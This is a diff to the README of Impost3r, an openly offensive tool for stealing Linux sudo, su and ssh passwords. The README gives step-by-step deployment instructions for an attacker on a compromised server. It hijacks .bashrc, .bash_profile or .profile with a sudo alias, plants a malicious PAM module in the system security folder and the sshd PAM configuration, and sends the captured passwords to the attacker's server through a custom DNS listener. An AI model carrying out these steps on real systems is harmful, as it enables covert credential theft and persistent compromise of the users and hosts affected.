@@ -33,9 +33,22 @@ Only need ordinary user's privilege,and can only steal current user's password.
 
 - First i will assume that attacker has controled a server and the privilege is ordinary user
 
-- Then copy the original .bashrc file ```cp ～/.bashrc /tmp/```,and put this copy anywhere you like(In this case,i will use /tmp/)
+- Check whether the ```.bash_profile``` file exists in the user's root directory. If the ```.bash_profile``` exists: then check whether ```.bashrc``` is actively loaded in the ```.bash_profile``` file, if it is actively loaded, skip this step and the next check, and continue with the subsequent operations.If ```.bashrc``` is not actively loaded, then **all operations for ```.bashrc``` in the following are replaced with operations for ```.bash_profile```!!!**; If ```.bash_profile``` does not exist: proceed to the next check.
 
-- Edit the original .bashrc,and add following sentences at the end of file(The param "/tmp/.impost3r" must be as the same as the following FILENAME you specified):
+- Check whether there is a ```.profile``` file in the user's root directory. If there is a ```.profile``` file: then check whether ```.bashrc``` is actively loaded in the ```.profile``` file (loaded by default), if it is actively loaded, skip this step and continue with the following operations.If it is not actively loaded, then **all operations for ```.bashrc``` in the following are replaced with operations for ```.profile```!!!**; if ```.profile``` does not exist, in principle, Impost3r will not be available, of course you can also depend on the situation to decide whether to generate ```.bash_profile``` or ```.profile``` file by yourself, and write loading code similar to the following to load ```.bashrc```
+
+```
+if [ -n "$BASH_VERSION" ]; then
+    # include .bashrc if it exists
+    if [ -f "$HOME/.bashrc" ]; then
+	. "$HOME/.bashrc"
+    fi
+fi
+```
+
+- Then copy the original ```.bashrc``` file ```cp ～/.bashrc /tmp/```,and put this copy anywhere you like(In this case,i will use /tmp/)
+
+- Edit the original ```.bashrc```,and add following sentences at the end of file(The param "/tmp/.impost3r" must be as the same as the following FILENAME you specified):
 
 ```
 alias sudo='impost3r() {
@@ -56,7 +69,8 @@ fi
     Custom setting
 */
 # define FILENAME "/tmp/.impost3r" \\Set the location where the Impost3r is on the server you attack.
-# define BACKUP_BASHRC "/tmp/.bashrc" \\Set the location where the backup .bashrc is on the server you attack.
+# define BACKUP_ORI_FILENAME ".bashrc" \\Indicates whether the source user profile backed up by the attacker is .bashrc, .bash_profile or .profile
+# define BACKUP_ORI_PATH "/tmp/.bashrc" \\Indicates the location of the source user profile backed up by the attacker on the target server
 # define SAVE_OR_SEND 0 \\Set the method you want to apply when Impost3r get the password,(send to your server=0,save the result on the current server=1,default is send)
 
 /*
@@ -76,9 +90,9 @@ fi
 ```
 - Save the source code,and run ```make``` 
 
-- Get the .impost3r file after compiling.
+- Get the ```.impost3r``` file after compiling.
 
-- Upload(Compile as much as possible on the target server to prevent unexpected errors) .impost3r file to the target server and put it under the FILENAME you specified.
+- Upload(Compile as much as possible on the target server to prevent unexpected errors) ```.impost3r``` file to the target server and put it under the FILENAME you specified.
 
 - The last thing you should do is run a dns server service on your server(REMOTE_ADDRESS)'s port(REMOTE_PORT),and waiting for the bonus.
 
@@ -127,9 +141,9 @@ The following uses Ubuntu as an example, Centos is similar,but the file location
 
 - After the modification is completed, save and execute ```make''` in the current directory
 
-- Get the compiled file impost3r.so
+- Get the compiled file ```impost3r.so```
 
-- Upload(Compile as much as possible on the target server to prevent unexpected errors) the compiled impost3r.so to the target server under ```/lib/x86_64-linux-gnu/security``` folder.(Different machines may have different folder names)
+- Upload(Compile as much as possible on the target server to prevent unexpected errors) the compiled ```impost3r.so``` to the target server under ```/lib/x86_64-linux-gnu/security``` folder.(Different machines may have different folder names)
 
 - Enter ```/etc/pam.d```, and then there are two cases. If the selected mode is to steal only the ssh password, then you need to execute ```vi sshd``` and add  at the following statement at the end of the file.
 
@@ -162,7 +176,7 @@ account optional impost3r.so
 ## Attention
 
 - The Dns server progran I use is [Fdns](https://github.com/deepdarkness/Fdns),and I change some params,you can find the changed source code under the ```Fdns``` folder,and use ```gcc -o dns main.c util.c``` to compile it by yourself(Remember changing the monitoring port in source code first).
-- Before compiling Fdns, please check the YOUR_DOMAIN value in util.h to ensure that this value is consistent with the YOUR_DOMAIN value used when compiling the Impost3r program implanted on the server, otherwise it may cause the failure of the stealing.
+- Before compiling Fdns, please check the ```YOUR_DOMAIN``` value in ```util.h``` to ensure that this value is consistent with the ```YOUR_DOMAIN``` value used when compiling the Impost3r program implanted on the server, otherwise it may cause the failure of the stealing.
 - This porject is coding just for fun , the logic structure and code structure are not strict enough, please don't be so serious about it,and also welcome suggestions and prs.
 
 ## Thanks
